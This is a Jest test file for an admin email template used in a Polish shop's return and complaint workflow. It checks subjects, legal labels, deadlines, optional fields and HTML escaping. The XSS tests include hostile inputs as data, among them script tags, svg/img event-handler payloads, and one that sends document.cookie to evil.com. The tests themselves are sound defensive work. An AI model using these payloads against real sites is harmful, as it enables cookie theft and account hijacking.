import { returnAdminNotificationTemplate } from '../return-admin-notification.template';

const BASE_WITHDRAWAL = {
  requestId: 'clx1234567890',
  orderNumber: 'ORD-2026-042',
  customerName: 'Anna Kowalska',
  email: 'anna@example.com',
  type: 'WITHDRAWAL' as const,
  deliveryDate: '2026-05-15',
  items: [{ productName: 'Perfumy Gold 50ml', quantity: 1 }],
};

const BASE_COMPLAINT = {
  ...BASE_WITHDRAWAL,
  type: 'COMPLAINT' as const,
  requestedResolution: 'REFUND',
  reason: 'Produkt jest wadliwy',
};

describe('returnAdminNotificationTemplate()', () => {
  // ── Subject line ──────────────────────────────────────────────────

  describe('subject', () => {
    it('WITHDRAWAL — subject contains "art. 27"', () => {
      const { subject } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(subject).toMatch(/art\.\s*27/i);
    });

    it('WITHDRAWAL — subject starts with bracket tag', () => {
      const { subject } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(subject).toMatch(/^\[Odstąpienie/i);
    });

    it('WITHDRAWAL — subject contains order number', () => {
      const { subject } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(subject).toContain('ORD-2026-042');
    });

    it('WITHDRAWAL — subject contains customer name', () => {
      const { subject } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(subject).toContain('Anna Kowalska');
    });

    it('COMPLAINT — subject starts with [Reklamacja]', () => {
      const { subject } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(subject).toMatch(/^\[Reklamacja/i);
    });

    it('COMPLAINT — subject does not mention art. 27', () => {
      const { subject } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(subject).not.toMatch(/art\.\s*27/i);
    });

    it('subjects differ between WITHDRAWAL and COMPLAINT', () => {
      const { subject: ws } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      const { subject: cs } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(ws).not.toBe(cs);
    });
  });

  // ── HTML — legal type label ───────────────────────────────────────

  describe('HTML — legal type label', () => {
    it('WITHDRAWAL — alert bar contains "art. 27 UPK"', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('art. 27 UPK');
    });

    it('WITHDRAWAL — alert bar contains "Odstąpienie od umowy"', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('Odstąpienie od umowy');
    });

    it('COMPLAINT — alert bar contains "Reklamacja (rękojmia)"', () => {
      const { html } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(html).toContain('Reklamacja (rękojmia)');
    });

    it('COMPLAINT — does not contain "art. 27" in body', () => {
      const { html } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(html).not.toMatch(/art\.\s*27/i);
    });
  });

  // ── HTML — alert bar colour ───────────────────────────────────────

  describe('HTML — alert bar colour', () => {
    it('WITHDRAWAL — uses yellow/warning background (#fff3cd)', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('#fff3cd');
    });

    it('COMPLAINT — uses red/danger background (#f8d7da)', () => {
      const { html } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(html).toContain('#f8d7da');
    });
  });

  // ── HTML — withdrawal deadline ────────────────────────────────────

  describe('HTML — withdrawal deadline row', () => {
    it('shows the delivery date when provided', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      // toLocaleDateString('pl-PL') for 2026-05-15 → '15.05.2026'
      expect(html).toContain('15.05.2026');
    });

    it('shows the 14-day return deadline for WITHDRAWAL', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      // deadline = 2026-05-15 + 14d = 2026-05-29
      expect(html).toContain('29.05.2026');
    });

    it('omits the delivery date row when deliveryDate is absent', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_WITHDRAWAL,
        deliveryDate: undefined,
      });
      expect(html).not.toContain('Data odbioru');
    });
  });

  // ── HTML — complaint-specific fields ─────────────────────────────

  describe('HTML — complaint resolution', () => {
    it('shows the human-readable resolution label', () => {
      const { html } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(html).toContain('Zwrot pieniędzy (odstąpienie)');
    });

    it('shows the reason text', () => {
      const { html } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(html).toContain('Produkt jest wadliwy');
    });

    it('omits the resolution block when not provided', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).not.toContain('Żądanie klienta');
    });
  });

  // ── HTML — optional fields ────────────────────────────────────────

  describe('HTML — optional fields', () => {
    it('shows IBAN when bankAccount is provided', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_WITHDRAWAL,
        bankAccount: 'PL61109010140000071219812874',
      });
      expect(html).toContain('PL61109010140000071219812874');
    });

    it('omits IBAN row when bankAccount is absent', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).not.toContain('Nr konta (IBAN)');
    });

    it('shows phone when provided', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_WITHDRAWAL,
        phone: '+48600123456',
      });
      expect(html).toContain('+48600123456');
    });
  });

  // ── HTML — common content ─────────────────────────────────────────

  describe('HTML — common content', () => {
    it('contains the request ID', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('clx1234567890');
    });

    it('contains the order number', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('ORD-2026-042');
    });

    it('contains the customer name', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('Anna Kowalska');
    });

    it('contains the customer email as a mailto link', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('mailto:anna@example.com');
    });

    it('contains item names', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('Perfumy Gold 50ml');
    });
  });

  // ── XSS — user-supplied fields are HTML-escaped ───────────────────

  describe('XSS — escaping', () => {
    it('escapes HTML in customerName', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_WITHDRAWAL,
        customerName: '<script>alert(1)</script>',
      });
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('escapes HTML in email address', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_WITHDRAWAL,
        email: '"onmouseover="alert(1)"@evil.com',
      });
      expect(html).not.toContain('"onmouseover="');
      expect(html).toContain('&quot;');
    });

    it('escapes HTML in reason text', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_COMPLAINT,
        reason: '<img src=x onerror=fetch("https://evil.com/"+document.cookie)>',
      });
      expect(html).not.toContain('<img');
      expect(html).toContain('&lt;img');
    });

    it('escapes HTML in phone number', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_WITHDRAWAL,
        phone: '"><svg/onload=alert(1)>',
      });
      expect(html).not.toContain('<svg');
      expect(html).toContain('&lt;svg');
    });

    it('escapes HTML in bankAccount', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_WITHDRAWAL,
        bankAccount: '<b>not-an-iban</b>',
      });
      expect(html).not.toContain('<b>');
      expect(html).toContain('&lt;b&gt;');
    });

    it('escapes HTML in item productName', () => {
      const { html } = returnAdminNotificationTemplate({
        ...BASE_WITHDRAWAL,
        items: [{ productName: '<script>evil()</script>', quantity: 1 }],
      });
      expect(html).not.toContain('<script>');
      expect(html).toContain('&lt;script&gt;');
    });

    it('passes safe customerName through unchanged', () => {
      const { html } = returnAdminNotificationTemplate(BASE_WITHDRAWAL);
      expect(html).toContain('Anna Kowalska');
    });

    it('passes safe reason through unchanged', () => {
      const { html } = returnAdminNotificationTemplate(BASE_COMPLAINT);
      expect(html).toContain('Produkt jest wadliwy');
    });
  });
});
